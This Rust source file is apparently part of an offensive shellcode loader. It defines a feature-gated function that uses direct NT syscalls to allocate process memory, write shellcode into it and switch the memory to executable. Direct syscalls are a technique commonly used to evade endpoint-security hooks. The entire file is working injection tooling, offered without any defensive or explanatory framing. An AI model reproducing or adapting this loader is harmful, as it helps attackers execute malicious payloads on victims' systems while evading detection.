use std::ffi::c_void;

// =======================================================================================================
// INJECTION METHOD: DEFAULT LOCAL
// =======================================================================================================

#[cfg(feature = "InjectionDefaultLocal")]
use rust_syscalls::syscall;

#[cfg(feature = "InjectionDefaultLocal")]
pub fn inject_default_local(bytes_to_load: &[u8]) -> Result<*mut c_void, i32> {
    unsafe {
        let mut base_address: *mut c_void = std::ptr::null_mut();
        let mut region_size: usize = bytes_to_load.len();
        let allocation_type: u32 = 0x1000;
        let mut return_value: i32;
        
        // Allocate memory with RW permissions
        return_value = syscall!("NtAllocateVirtualMemory", -1isize, &mut base_address, 0, &mut region_size, allocation_type, 0x04);
        if return_value != 0 {
            return Err(return_value);
        }
        
        // Write shellcode to allocated memory
        let shellcode_ptr = bytes_to_load.as_ptr() as *const c_void;
        let mut bytes_written: usize = 0;
        return_value = syscall!("NtWriteVirtualMemory", -1isize, base_address, shellcode_ptr, bytes_to_load.len(), &mut bytes_written);
        if return_value != 0 {
            return Err(return_value);
        }
        
        // Change memory protection to RX
        let mut protectaddress_to_protect: *mut c_void = base_address;
        let mut size_to_protect = bytes_to_load.len();
        let mut oldprotect: u32 = 0;
        return_value = syscall!("NtProtectVirtualMemory", -1isize, &mut protectaddress_to_protect, &mut size_to_protect, 0x20, &mut oldprotect);
        if return_value != 0 {
            return Err(return_value);
        }
        
        Ok(base_address)
    }
}
